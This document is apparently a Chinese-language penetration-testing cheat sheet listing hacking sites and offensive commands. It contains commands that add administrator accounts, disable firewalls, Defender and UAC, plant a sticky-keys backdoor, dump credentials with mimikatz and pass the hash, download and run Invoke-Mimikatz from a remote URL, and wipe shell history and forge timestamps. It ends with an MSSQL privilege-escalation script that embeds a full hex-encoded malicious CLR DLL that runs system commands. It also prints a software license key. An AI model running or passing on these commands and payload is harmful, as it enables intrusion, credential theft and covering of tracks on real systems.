# go-bi-soft
```
ufw allow 22
ufw delete allow 22
ufw enable
ufw disable
ufw status
```
# 主机推荐
+ https://www.vultr.com/
+ https://www.dynu.com/
+ https://www.gmail.com/
+ https://vgostore.xyz/product/windows-vps/
+ https://contabo.com/de/

# 搜索引擎
+ https://www.greynoise.io/
+ https://www.zoomeye.org/
+ https://www.shodan.io/
+ https://fofa.info/
+ https://publicwww.com/
+ https://natlas.io/
+ https://www.qwant.com/
+ https://rapiddns.io/
+ https://dnsdumpster.com/
+ https://www.virustotal.com/gui/home/search
+ https://domainbigdata.com/
+ https://www.robtex.com/cidr/

# 小工具
+ https://securityxploded.com/
+ https://mirrors.huaweicloud.com/home
+ http://www.nirsoft.net/
+ https://sysin.org/
+ https://breakingsecurity.net/
+ https://nssm.cc/download

# 反弹shell
+ https://www.revshells.com/

# OS提权
+ https://gtfobins.github.io/
+ https://www.hackingarticles.in/category/red-teaming/page/2/
+ https://cyber-security.tk/exploit/Linux-Privilege-Escalation/
+ https://cyber-security.tk/exploit/Windows-Privilege-Escalation/

# 文件传输
+ https://transfer.sh/

# 加密解密
+ https://www.cmd5.com/
+ https://www.somd5.com/
+ https://hashes.com/zh/decrypt/hash
+ https://encode-decode.com/
+ https://hashcat.net/hashcat/
+ https://www.jsjiami.com/
+ https://okjson.608558.com/encrypt/openssl_encode
+ https://www.devglan.com/online-tools/triple-des-encrypt-decrypt
+ http://tool.chacuo.net/cryptrijndael
# gost(GO语言)实现的安全隧道
```
./gost -L=:1080	//作为标准HTTP/SOCKS5代理
./gost -L=admin:123456@:1080	//设置代理认证信息
./gost -L=http2://:443 -L=socks5://:1080 -L=ss://aes-128-cfb:123456@:8338	//多端口监听
nohup ./gost -L=:1080 > /dev/null 2>&1 &	//后台运行不记录日志
```
# ipv4的3段私有IP地址

```
A类：10.0.0.0/8	即10.0.0.0-10.255.255.255

B类：172.16.0.0/12 即172.16.0.1-172.31.255.254

C类：192.168.0.0/16 即192.168.0.1-192.168.255.254
```
# 探测大网络空间中的存活主机

扫描一个巨大的网络空间，我们最关心的是效率问题，即时间成本。 在足够迅速的前提下，宁可牺牲掉一些准确性。
```
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 10.txt 10.0.0.0/8 > /dev/null 2>&1
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 172.txt 172.16.0.0/12 > /dev/null 2>&1
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 192.txt 192.168.0.0/16 > /dev/null 2>&1
或
fping -a -g 10.0.0.0/8 >10.txt
fping -a -g 172.16.0.0/12 >172.txt
fping -a -g 192.168.0.0/16 >192.txt
或
masscan 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 --ping --max-rate 100000 >all.txt
masscan 0.0.0.0/0 -p443,8443 --max-rate 100000 --heartbleed >443.txt	//心脏滴血漏洞扫描
masscan -p80 0.0.0.0/0 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 --max-rate 300000 >all.txt	//扫描全网80端口ip段，排除内网ip段(或机房ip段)
或
masscan -p80 0.0.0.0/0 --excludefile blackip.txt --max-rate 300000 >all.txt	//扫描全网80端口ip段，blackip.txt填写排除ip地址或ip段每行一个
```
**备注** Windows、Mac或VM没有针对数据包传输进行调整，每秒只能获得大约300,000个数据包，而Linux可以每秒执行1,500,000个数据包。

# 大型网络常用渗透端口
`masscan -p21,22,23,161,389,445,873,1080,1433,1521,2049,2376,3000,3306,3389,3690,4848,5432,6379,7001,7002,8000,8161,8080,9000,9200,9990,11211,27017,50000 --banners --max-rate 100000 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 > result.txt`
```
21,22,53,80-89,161,389,443,445,873,1080,1098,1099,1352,1443,1194,1723,1433,1521,2049,2222,2376,3000,3306,3389,3690,4848,4899,5000,5432,5900,5984,6379,7001,7002,8000,8001,8291,8443,8080-8089,8161,8808,8888,8899,9080,9090,9200,9300,9999,10443,27017,27018,50000
```
# ssh免密登录私钥收集
在gitlab或jenkins的服务器上通常存在id_rsa私钥(实现免密登录)
```
find / -name id_rsa	//查找私钥
ssh -i id_rsa user@xxx	//公钥免密登录
```

# Windows渗透常用命令
```
type  *.txt  > all.txt	//多个txt文件合并
net user test 1234 /add	//添加新用户
net localgroup administrators test /add	//添加新用户到管理员组
taskkill /F /IM "cmd.exe"	//按名称杀死进程
taskkill /pid xxx -t -f	//强制结束pid进程和子进程
shutdown /r /t 0	//立即重启
shutdown /s /t 0	//立即关机
fsutil fsinfo drives	//查找系统上的所有硬盘/存储分区
netsh firewall set opmode disable	//关闭Windows防火墙
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f	//将管理员的UAC行为设置为"不提示"
netsh Advfirewall set allprofiles state off	//关闭防火墙
netsh Advfirewall set allprofiles state on	//开启防火墙
netsh Advfirewall show allprofiles	//检查防火墙状态
netsh -c interface dump	//将当前网络配置导出查看
sc query | more	//检查系统所有服务
sc stop cc_cometDaemon.exe	//停止服务
sc start cc_cometDaemon.exe	//开启服务
sc query cc_cometDaemon.exe	//检查停止状态
sc config cc_cometDaemon.exe start=disabled	//禁用服务
sc config cc_cometDaemon.exe start=auto	//服务自启动
wmic process where Name="xxx.exe" get ProcessId,name,commandline	//查询某进程信息.进程id、进程名、执行命令 
C:/WINNT/system32/inetsrv/MetaBase.bin	//IIS 5 中，IIS 的配置文件
C:/WINDOWS/system32/inetsrv/MetaBase.xml	//IIS 6 中，IIS 的配置文件
C:/WINDOWS/system32/inetstr/config/applicationHost.config	//IIS 7 中，IIS 的配置文件
或
iis6:type  %systemroot%\system32\inetsrv\metabase.xml|findstr Path=
iis7/8:type %systemroot%\System32\inetsrv\config\applicationHost.config|findstr physicalPath=
iis7/8:  %windir%\system32\inetsrv\appcmd list site	//查看网站列表
iis7/8:  %windir%\system32\inetsrv\appcmd list sites /state:started	//列出开始的站点
iis7/8:  %windir%\system32\inetsrv\appcmd list sites /state:stopped	//列出停止的站点
type c:\windows\system32\drivers\etc\hosts	//查看hosts文件
netsh firewall set icmpsetting 8	//开启外部ping
netsh firewall set icmpsetting 8 disable	//禁止外部Ping
ipconfig /displaydns	//查看本地DNS缓存
wmic OS get Caption, CSDVersion, OSArchitecture, Version	//获取系统版本信息
wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct get /format:LIST	//查找系统安装的杀毒软件
wmic product get name,version	//查看当前安装的程序
net config workstation	//查看当前登陆域
cmdkey /list	//获取远程桌面连接过的历史账户列表
attrib +h "your_folder_or_file"	//隐藏文件夹或文件
attrib +h "d:\demo\*" /s /d
dir /a:h	//列出隐藏文件
attrib -s -h "your_hidden_folder_or_file"	//取消隐藏文件夹或文件

REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f	//关闭 Windows Defender 杀毒
REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 0 /t REG_DWORD /f	//开启 Windows Defender 杀毒
REG add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1	//将regedit值设置为1并启动wdigest auth抓取明文密码
REG query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential	//查询是否启用wdigest auth抓取明文密码
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "c:\windows\system32\cmd.exe" /d "RUNASADMIN" /f	//以管理员权限执行命令
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "c:\windows\system32\cmd.exe" /f	//删除以管理员权限执行命令
mstsc /admin /v:192.168.58.129	//突破终端服务器已超过允许的最大连接数
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f	//启用RDP访问3389
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber //十六进制转十进制，查看rdp端口
或
tasklist /svc |find "TermService" //查看系统进程TermService服务对应的PID
netstat -ano | findstr pid	//查找TermService服务PID对应的端口
或
for /f "tokens=2 delims=x" %a in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" ^| find "PortNumber"') do (set /a n=0x%a)
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fSingleSessionPerUser /t REG_DWORD /d 0 /f	//设置单用户允许多个RDP会话
REG query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fSingleSessionPerUser	//查看是否开单用户允许多个RDP会话
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f	//sethc粘键后门后门
ntsd -cq -pn SafeDogGuardCenter.exe	//搞死安全狗3.x
for /r c:\ %i in (Newslist*.aspx) do @echo %i	//在WINDOWS下命令查找文件
```
# mimikatz常用命令
```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonPasswords full" exit	//获取密码
procdump.exe -accepteula -ma lsass.exe lsass.dmp	//32系统转储内存
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp	//64系统转储内存
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"	//通过转储内存文件获取密码
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /ntlm:{NTLM_hash} \"/run:mstsc.exe /restrictedadmin\""	//mimikatz传递哈希
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /aes256:{aes256_hmac} \"/run:mstsc.exe /restrictedadmin\""	//mimikatz传递AES-KEY
PowerShell IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’) ; Invoke-Mimikatz -DumpCreds	//远程加载mimikatz
```
# Linux系统信息
```
uname -a //查看内核/操作系统/CPU信息
cat /etc/issue //查看操作系统版本
cat /proc/version	//查看系统版本
cat /proc/cpuinfo //查看CPU信息
hostname //查看计算机名
userdel -r user	//删除用户并清除home目录
runlevel //查看运行级别
lsusb -tv //列出所有USB设备
env //查看环境变量
updatedb	//更新locate的默认数据库增加索引 
pinky //当前已登陆用户
sudo -l	//当前用户可以以root身份执行的命令
curl ifconfig.me	//获取本机外网ip地址
curl https://ip.cn	//获取本机外网ip地址
cat /etc/ppp/chap-secrets	//获取vpn服务pptp账号密码
strings /usr/sbin/sshd | grep /
strings /usr/sbin/sshd | grep password 	//查看ssh后门记录路径文件
rpm -qV pam	//centos rpm校验已安装pam包是否被修改
cat /etc/psa/.psa.shadow	//显示Plesk管理员密码
tail -n 100 error_log	//显示该文件的最新100行
tail -f access_log	//实时查看该文件更新
pkill -kill -t tty	//强制踢掉登录用户tty
cat /etc/network/interfaces	//查看网卡信息
pwgen	//复杂密码随机生成工具
apt-get install net-tools	//debian新版默认没有ifconfig、netstat需要安装net-tools包
ip a	//debian新版查看ip命令
apt-get install geany	//Geany编辑器
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'	//列出所有超级用户帐户
sed -i 's/#Port 22/Port 42318/' /etc/ssh/sshd_config	//替换sshd服务端口
cat /etc/shells	//有效登录shell的路径名
cat /etc/resolv.conf	//显示配置的DNS服务器地址
[space]set +o history	//[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。
[Space]set -o history	//它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。
export ALL_PROXY=socks5://127.0.0.1:1080	//只对当前终端有效，强制命令走socks5代理
grep -r -l -i -I passw /	//查找其中包含字符串“ passw”的文件
find /etc/ -readable -type f 2>/dev/null	//列出我们可以阅读的配置文件
find /var/log -readable -type f 2>/dev/null 	//列出我们可以阅读的日志文件
cut -d: -f1 /etc/passwd	//获取当前账户列表
7z a -t7z -r -mx=9 xxx.7z dir/	//7z极限压缩
rpm -q --qf "%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\n" pam	//通过使用rpm 的--qf或 --queryformat选项，可以分别输出这些字段和其他字段pam-1.1.8-9.el7.x86_64
dpkg-query -W -f='${Package}-${Version}-${Architecture}\n' libpam-modules-bin	//通过使用dpkg-query的-W和-f或--showformat选项，可以分别输出这些字段和其他字段libpam-modules-bin-1.3.1-5-amd64
grep -nv 'root' /etc/passwd	//过滤出不带有某个关键词的行并输出行号
lsof -u root	//查看某个用户启动了什么进程
lsof -i:8080	//某个端口是哪个进程打开的
netstat -anp	//a参数是列出所有连接，n是不要解析机器名，p列出进程名
ps -ef | grep tomcat	//查看tomcat进程
netstat -anop | grep 5517	//根据进程号查看tomcat端口号
```
# 反病毒常用
```
netstat -antp
ps auxef
while true; do netstat -antp | grep [ip]; done 
ll /proc/[pid]/exe	//查找进程文件
strace -tt -T -e trace=all -p [pid]	//跟踪异常进程运行情况
lsof-p [pid]	//查看进程打开的文件
grep "Accepted " /var/log/secure* | awk '{print $1,$2,$3,$9,$11}'	//查看登录成功的日期、用户名及ip
find /etc/ /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/ /var/spool/cron/ -type f -mtime -1 | xargs ls -l
awk -F ":" '$3==0{print $1}' /etc/passwd	//查找特权用户
awk '/\$1|\$6/{print $1}' /etc/shadow	//查找可以远程登录的账号信息
cat /etc/sudoers | grep -v "^#\|^$" | grep "ALL=(ALL)"	//查找sudo权限账户
grep "Failed password" /var/log/secure | awk {'print $9'} | sort | uniq -c | sort -nr	//查看爆破用户名字典 
cat /etc/rc.local
service –status-all
chkconfig --list	//确认是否有异常开机启动项 
grep -rn "[ip]" * /	//查找关键字
ps -ef | grep sshd	//跟踪SSHD进程
strace -o sshd.strace -f -p [pid]	//跟踪异常进程运行情况,并输出到sshd.strace
cat sshd.strace	//查看异常进程情况
strings -td /lib/x86_64-linux-gnu/security/pam_unix.so	//pam_unix.so文件字符串检查
```
# 网络信息
```
ifconfig	//查看所有网络接口的属性
iptables -L	//查看防火墙设置
route -n	//查看路由表
netstat -lntp	//查看所有监听端口
netstat -antp	//查看所有已经建立的连接
netstat -s	//查看网络统计信息
```
# 文件查找
```
find . -name '*.php' -mmin -60	//检查60分钟内当前目录中.PHP文件被修改过的文件
find . -name '*.php' -mtime 0	//查找当前目录中24小时内修改过的PHP文件,这个比较常用于网页文件的检查，是否有被修改的痕迹。
find . -name "[A-Z]*" -print	//查找当前目录中以有大写字母开头的文件
find /www -name "vps*" -print	//查找www目录中以vps开头的文件
find . -perm 777 -print	//查到当前目录中具有777权限的文件
find . -size +1000000c -print	//查找当前目录中文件字节数大于1MB的文件
find -type f -mtime -3	//最近3天修改过的文件
find -type f -ctime -3	//最近3天创建的文件
```
# chcon命令更改SELinux安全上下文

+ 错误的安全上下文`unconfined_u:object_r:admin_home_t:s0`
+ 正确的安全上下文`system_u:object_r:httpd_config_t:s0`

```
ls -lZ xxx	//查看安全上下文
chcon --reference=ssl.conf httpd.conf	//使用ssl.conf安全上下文用于httpd.conf
```
# lrzsz上传下载
```
yum -y install lrzsz	//安装
rz filename		//上传
sz filename 	//下载
```
# SSH免密码登录
```
ssh-keygen	//在本地服务器上生成密钥对
ssh-copy-id -i ~/.ssh/id_rsa.pub UserName@RemoteServer	//在远程服务器上安装公钥,SSH公钥保存在远程Linux服务器的.ssh/authorized_keys文件中
ssh root@x.x.x.x -i ~/.ssh/id_rsa	//id_rsa免密登陆,修改id_rsa权限chmod 600 id_rsa
```
# whereis搜索程序名和which路径查找
```
whereis	//命令搜索程序名
which	//命令是查找命令是否存在，以及命令的存放位置在哪儿
```
# 后台运行
```
nohup /usr/local/node/bin/node /www/im/chat.js >> /usr/local/node/output.log 2>&1 &	//不挂断地运行命令,在后台运行
```

# 用chattr命令防止系统中某个关键文件被修改
```
chattr +i /etc/fstab	//开启文件或目录的该项属性
chattr -i /etc/fstab	//关闭文件或目录的该项属性
lsattr passwd			//查看文件属性
s---ia-------e-- passwd
chattr -isa /etc/passwd	//关闭文件sai属性
```
# who命令查看用户登录时间
```
who /var/log/wtmp
```
# touch命令用于创建文件或修改文件/目录的时间戳
```
stat tgs.txt	//命令查看当前文件的时间戳
touch -d "2012-10-19 12:12:12.000000000 +0530" tgs.txt	//使用字符串来更改时间
touch -r tgs.txt a.txt 	//使用tgs.txt文件的访问和修改时间戳更新文件a.txt的时间戳
```
# 清除BASH历史
```
<space>命令	//在命令前放置一个空格，它不会保存在Bash历史记录中
history -cw	//清除所有Bash历史记录
history -dw 352	//从Bash历史记录文件中删除某一行(例如352)
history -r	//仅清除当前会话的Bash历史记录
export HISTSIZE=0	//禁用当前会话的所有历史记录
export HISTFILE=/dev/null	//丢弃当前会话的所有历史记录
[space]set +o history	//单次会话中禁用某一段命令记录
[Space]set -o history	//单次会话中启用某一段命令记录
```
# nmap代理扫描
```
proxychains nmap -sT -PN -n -sV -p 80,443,21,22 217.xx.xx.xx
```
# tar打包命令
```
tar -zcvf  test.tar.gz  /home/test/ --ignore-failed-read	//直接打包tar.gz
tar -xvf  test.tar.gz	//解压缩tar.gz
tar --exclude /home/public_html/img -zcvf test.tar.gz  /home/public_html/	//排除目录img
tar -tvf test.tar.gz | more	//列出tar.gz压缩包内容
tar czvf test.tar.gz --exclude=\*.{jpg,gif,png,wmv,flv,tar.gz,zip} /home/me	//排除多个特定文件类型
tar -zcvf /tmp/test.tar.gz -X exclude.txt /home/me	//排除多目录或特定文件类型
cat exclude.txt	//附加文件名
abc
xyz
*.bak
```
# Centos/Debian/Ubuntu安装masscan
```
yum install -y unzip gcc make libpcap-devel
wget https://github.com/robertdavidgraham/masscan/archive/master.zip
unzip master.zip && cd masscan*
make && make install && cd ../ && rm -rf master.zip masscan*
或
sudo apt-get install -y unzip gcc make libpcap-dev
wget https://github.com/robertdavidgraham/masscan/archive/master.zip
unzip master.zip && cd masscan*
sudo make && sudo make install && cd ../ && rm -rf master.zip masscan*
```
# nbtscan安装
```
wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz -O /tmp/nbtscan.tgz && mkdir /tmp/nbtscan && rm -rf nbtscan.tgz && tar -xvzf nbtscan.tgz -C /tmp/nbtscan && cd /tmp/nbtscan && make && ./nbtscan
wget https://ftp.tu-chemnitz.de/pub/linux/dag/redhat/el7/en/x86_64/rpmforge/RPMS/nbtscan-1.5.1-1.2.el7.rf.x86_64.rpm && rpm -ivh nbtscan-1.5.1-1.2.el7.rf.x86_64.rpm && rm -rf nbtscan-1.5.1-1.2.el7.rf.x86_64.rpm
```

# 编辑器
+ [EmEditor](https://www.emeditor.com/)
  + DMAZM-WHY52-AX222-ZQJXN-79JXH
+ [Sublime Text](https://www.sublimetext.com/) 
+ [Notepad++](https://github.com/notepad-plus-plus/notepad-plus-plus/releases)
+ [Typora](https://download.typora.io/windows/typora-setup-x64-0.11.18.exe)

# 本地代理
+ [Proxifier](https://www.proxifier.com/)
  +   模拟器代理规则[雷电、夜神] `ldboxheadless.exe; noxvmhandle.exe`

# 安卓抓包
## 绕过证书固定
+ [JustTrustMe](https://github.com/Fuzion24/JustTrustMe)
+ [Android-SSL-TrustKiller](https://github.com/iSECPartners/Android-SSL-TrustKiller)
+ [burpsuite+brida](https://github.com/portswigger/brida)
+ [Sandroid-ssl-pinning-demo(证书固定演示)](https://github.com/httptoolkit/android-ssl-pinning-demo/releases)
+ [apk-mitm(自动修改apk)](https://github.com/shroudedcode/apk-mitm)

# 参考链接
+ https://medium.com/globant/testing-ssl-pinning-in-a-mobile-application-2dcac9ab3d0c
+ https://www.hackingarticles.in/android-hooking-and-sslpinning-using-objection-framework/
+ https://github.com/httptoolkit/android-ssl-pinning-demo
+ https://vavkamil.cz/2019/09/15/how-to-bypass-android-certificate-pinning-and-intercept-ssl-traffic/
+ https://arben.sh/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning/
+ https://codeshare.frida.re/@sowdust/universal-android-ssl-pinning-bypass-2/
+ https://justinpineda.com/2020/11/27/bypassing-ssl-pinning-and-traffic-redirection-to-burp-suite-using-mobsf-and-genymotion/
+ https://www.freebuf.com/sectool/280622.html
+ https://github.com/shroudedcode/apk-mitm

# 漏洞wiki
+ https://cobalt.io/vulnerability-wiki
+ https://github.com/swisskyrepo/PayloadsAllTheThings

# 在线反编译器
+ [JAR String Editor](https://www.decompiler.com/jar-string-editor)

# 端口转发
+ https://ngrok.com/

# 编程开发
+ http://www.rohitab.com/discuss/forum/9-source-codes/
+ https://search.unprotect.it/
+ https://www.phrozen.io/

# xss平台
+ https://xsshunter.com/

# 实验软件环境
+ [Redis for Windows](https://github.com/tporadowski/redis/releases/)
+ https://github.com/MicrosoftArchive/redis/releases
  + [Another Redis DeskTop Manage](https://github.com/qishibo/AnotherRedisDesktopManager/releases) 
  + https://github.com/MicrosoftArchive/redis/releases
# mssql 2008 自定义dll提权
```
;开启mssql CLR功能
sp_configure 'clr enabled', 1
GO
RECONFIGURE
GO
;数据库标记为安全的程序集
ALTER DATABASE master SET TRUSTWORTHY ON;
;导入程序集
CREATE ASSEMBLY [evilclr]
    AUTHORIZATION [dbo]
    FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C01030068BBB65D0000000000000000E00022200B013000000E000000060000000000004E2C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000FC2B00004F00000000400000A002000000000000000000000000000000000000006000000C000000C42A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000540C000000200000000E000000020000000000000000000000000000200000602E72737263000000A0020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000302C00000000000048000000020005007C220000480800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076322E302E35303732370000000005006C000000A8020000237E000014030000B003000023537472696E677300000000C4060000B4000000235553007807000010000000234755494400000088070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000CC0101000000000006006601B60206008601B60206003C01A3020F00D602000006003803D8010A0050014E020E001103A3020600DF01D80106002002760306002101B6020E00F602A3020A0082034E020A0019014E020600BA01D8010E00F701A3020E00C800A3020E003502A30206000802360006001502360006002700D801000000002D00000000000100010001001000E5020000150001000100030110000100000015000100040006006C037900502000000000960083007D00010084200000000096008F001A0002005C220000000086189D02060004005C220000000086189D0206000400652200000000830016008200040000000100750000000100E800000002002703000001002E02000002000C0309009D02010011009D02060019009D020A0031009D02060051009D02060061001001100069009A001500710031031A0039009D0206003900E90132007900DB0015007100A003370079001903150079008D033C007900B80041007900A4013C00790083023C00790051033C0049009D02060089009D02470039005E004D0039004B0353003900F1000600390071025700990079005C0039003F0306004100AC005C0039009F0060002900B8015C004900050164004900C1016000A100B8015C00710031036A0029009D02060059004C005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA00200004800000000000000000000000000000000069020000020000000000000000000000700055000000000002000000000000000000000070004000000000000200000000000000000000007000D80100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F3000496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468006576696C636C722E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006576696C636C72006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A00200000001E897910CE56A742B9629E72009C5099000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000701000000000401000000000000000068BBB65D00000000020000001C010000E02A0000E00C0000525344534FDE46A4C9F4284FAAE5619111BF655C01000000453A5C636F64655C6373686172705C6576696C636C725C6576696C636C725C6F626A5C44656275675C6576696C636C722E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000242C000000000000000000003E2C0000002000000000000000000000000000000000000000000000302C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500200010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000440200000000000000000000440234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004A4010000010053007400720069006E006700460069006C00650049006E0066006F0000008001000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D00650000006500760069006C0063006C0072002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006500760069006C0063006C0072002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000